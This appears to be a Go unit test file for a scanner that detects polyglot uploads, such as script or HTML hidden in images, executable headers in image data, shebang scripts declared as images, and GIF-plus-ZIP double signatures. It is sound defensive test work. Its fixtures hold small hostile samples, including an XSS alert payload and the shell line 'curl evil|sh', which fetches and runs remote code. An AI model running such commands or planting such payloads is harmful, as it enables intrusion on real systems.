package main

import "testing"

func pgHasReason(fs []PGFinding, reason string) bool {
	for _, f := range fs {
		if f.Reason == reason {
			return true
		}
	}
	return false
}

func TestPGCleanPNG(t *testing.T) {
	pol := DefaultPGPolicy()
	png := []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}
	png = append(png, []byte("IHDRbinaryimagedatapixels")...)
	if f := PGScan(png, MSNKindImage, pol); len(f) != 0 {
		t.Fatalf("clean png must pass: %v", f)
	}
}

func TestPGScriptInGIF(t *testing.T) {
	pol := DefaultPGPolicy()
	gif := append([]byte("GIF89a"), []byte("<script>alert(1)</script>")...)
	f := PGScan(gif, MSNKindImage, pol)
	if !pgHasReason(f, PGReasonActiveContentInImage) {
		t.Fatal("script inside gif must be flagged")
	}
}

func TestPGHTMLDoctypeInImage(t *testing.T) {
	pol := DefaultPGPolicy()
	data := append([]byte{0xFF, 0xD8, 0xFF}, []byte("<!doctype html><body>")...)
	f := PGScan(data, MSNKindImage, pol)
	if !pgHasReason(f, PGReasonHTMLSniffRisk) {
		t.Fatal("html doctype inside jpeg must be flagged")
	}
}

func TestPGScriptInPDF(t *testing.T) {
	pol := DefaultPGPolicy()
	pdf := append([]byte("%PDF-1.7\n"), []byte("/JavaScript <script>x</script>")...)
	f := PGScan(pdf, MSNKindPDF, pol)
	if !pgHasReason(f, PGReasonActiveContentInPDF) {
		t.Fatal("active marker inside pdf must be flagged")
	}
}

func TestPGExecMagicInImage(t *testing.T) {
	pol := DefaultPGPolicy()
	data := []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A}
	data = append(data, []byte("paddingpadding")...)
	data = append(data, 'M', 'Z', 0x90, 0x00)
	f := PGScan(data, MSNKindImage, pol)
	if !pgHasReason(f, PGReasonExecMagicInImage) {
		t.Fatal("MZ inside png must be flagged")
	}
}

func TestPGELFInImage(t *testing.T) {
	pol := DefaultPGPolicy()
	data := append([]byte("GIF89apadding"), 0x7f, 'E', 'L', 'F', 0x02)
	f := PGScan(data, MSNKindImage, pol)
	if !pgHasReason(f, PGReasonExecMagicInImage) {
		t.Fatal("ELF inside gif must be flagged")
	}
}

func TestPGShebang(t *testing.T) {
	pol := DefaultPGPolicy()
	data := []byte("#!/bin/sh\ncurl evil|sh\n")
	// 声明为图片但实际是脚本。
	if f := PGScan(data, MSNKindImage, pol); !pgHasReason(f, PGReasonShebangInData) {
		t.Fatal("shebang in declared image must be flagged")
	}
}

func TestPGDoubleMagic(t *testing.T) {
	pol := DefaultPGPolicy()
	data := []byte("GIF89a")
	data = append(data, []byte("junkjunkjunk")...)
	data = append(data, 'P', 'K', 0x03, 0x04)
	if f := PGDetectDoubleMagic(data, pol); !pgHasReason(f, PGReasonDoubleMagic) {
		t.Fatal("gif+zip double magic must be flagged")
	}
}

func TestPGNonDataKindSkipped(t *testing.T) {
	pol := DefaultPGPolicy()
	// 普通 HTML 文件含 <script> 是正常的，不应误报。
	html := []byte("<html><script>ok()</script></html>")
	if f := PGScan(html, MSNKindHTML, pol); len(f) != 0 {
		t.Fatalf("script in genuine html must not be flagged: %v", f)
	}
}

func TestPGIsSafe(t *testing.T) {
	clean := []byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}
	clean = append(clean, []byte("IHDRlotsandlotsofbytes")...)
	if !PGIsSafe(clean, MSNKindImage) {
		t.Fatal("clean image must be safe")
	}
	bad := append([]byte("GIF89a"), []byte("<script>x</script>")...)
	if PGIsSafe(bad, MSNKindImage) {
		t.Fatal("polyglot gif must not be safe")
	}
}
